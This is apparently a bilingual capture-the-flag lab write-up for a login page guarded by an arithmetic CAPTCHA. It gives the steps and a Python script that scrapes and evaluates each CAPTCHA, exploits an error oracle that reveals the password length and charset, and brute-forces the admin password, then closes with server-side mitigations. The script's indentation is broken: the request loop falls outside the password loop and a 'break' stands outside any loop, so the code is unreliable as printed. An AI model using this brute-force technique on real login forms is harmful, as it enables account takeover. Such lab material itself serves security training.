Objetivo

Automatizar el login de admin resolviendo un CAPTCHA nuevo en cada intento y recuperar la flag.

Comportamiento por dificultad

  • Easy: el reto es una suma visible y no hay nonce.
  • Medium: el reto puede ser suma o resta, hay captcha_nonce y rate-limit moderado.
  • Hard: el reto incluye tres términos, el nonce caduca al usarlo y el challenge expira.

Oraculo de errores

  • CAPTCHA correcto + credenciales incorrectas: Error: el password debe tener 5 caracteres y el character set a,x,4,M,]
  • Credenciales correctas + CAPTCHA incorrecto: Error: CAPTCHA incorrecto!

Pasos

  1. Haz GET /captcha/login con una sesión persistente.
  2. Extrae el texto de data-captcha-expression y calcula la expresión.
  3. Si existe captcha_nonce, envíalo de vuelta en el POST.
  4. Prueba passwords de longitud 5 con el charset {{ captcha_charset }}.

Scripting - Enumeracion del CAPTCHA

Primero hacemos una peticion GET para entender como cambia el reto y que cookie de sesion entrega el servidor.

import re
import requests

session = requests.Session()
regex = r'<span data-captcha-expression>(.*?)</span>'

response = session.get('{{ target_base }}/captcha/login')
output = re.search(regex, response.text)

print(session.cookies.get_dict())
print(output.group(1))

import re
import time

import requests

BASE = "{{ target_base }}"
CAPTCHA_RE = re.compile(r'<span data-captcha-expression>(.*?)</span>')
NONCE_RE = re.compile(r'name="captcha_nonce"\s+value="([^"]+)"')
FLAG_RE = re.compile(r'HL\{[^}]+\}')
SUCCESS_RE = re.compile(r'alert-success[\s\S]{0,500}(Login correcto|Login successful)')


def fetch_challenge(session):
    response = session.get(f'{BASE}/captcha/login', timeout=10)
    expression = CAPTCHA_RE.search(response.text).group(1)
    nonce = NONCE_RE.search(response.text)
    return expression, nonce.group(1) if nonce else None


session = requests.Session()

with open('passwords.txt', 'r', encoding='utf-8') as f:
    for password in f:
        password = password.strip()
        if not password:
            continue

    while True:
        expression, nonce = fetch_challenge(session)
        cookies = session.cookies.get_dict()
        captcha = eval(expression, {"__builtins__": {}}, {})

        print("Probando password: " + password)
        data = {
            "username": "admin",
            "password": password,
            "captcha": captcha,
        }
        if nonce:
            data["captcha_nonce"] = nonce

        response = session.post(
            f'{BASE}/captcha/login',
            cookies=cookies,
            data=data,
            timeout=10,
        )
        visible_html = response.text.split('<div id="resolution-data"', 1)[0]
        if response.status_code == 429 or "Demasiados intentos" in visible_html:
            time.sleep(10)
            continue
        break

    flag = FLAG_RE.search(visible_html)
    if flag or SUCCESS_RE.search(visible_html):
        print("Password valido: " + password)
        if flag:
            print(flag.group(0))
        break

Mitigacion

No confies en retos que el cliente puede leer y resolver trivialmente. Aplica controles del lado servidor: anti-automation por cuenta/IP, caducidad corta, tokens de un solo uso, monitorizacion y un proveedor CAPTCHA resistente a automatizacion.

Goal

Automate the admin login by solving a fresh CAPTCHA for every attempt and recover the flag.

Behavior by difficulty

  • Easy: visible addition and no nonce.
  • Medium: addition or subtraction, captcha_nonce and moderate rate-limit.
  • Hard: three-term expression, one-use nonce and expiring challenge.

Error oracle

  • Correct CAPTCHA + bad credentials: Error: the password must have 5 characters and use the character set a,x,4,M,]
  • Correct credentials + bad CAPTCHA: Error: CAPTCHA incorrect!

Steps

  1. Send GET /captcha/login with a persistent session.
  2. Extract the text from data-captcha-expression and calculate the expression.
  3. If captcha_nonce exists, submit it back with the POST.
  4. Try 5-character passwords using the charset {{ captcha_charset }}.

Mitigation

Do not trust challenges that the client can read and solve trivially. Enforce server-side controls: account/IP automation limits, short expiry, one-use tokens, monitoring and a CAPTCHA provider designed to resist automation.
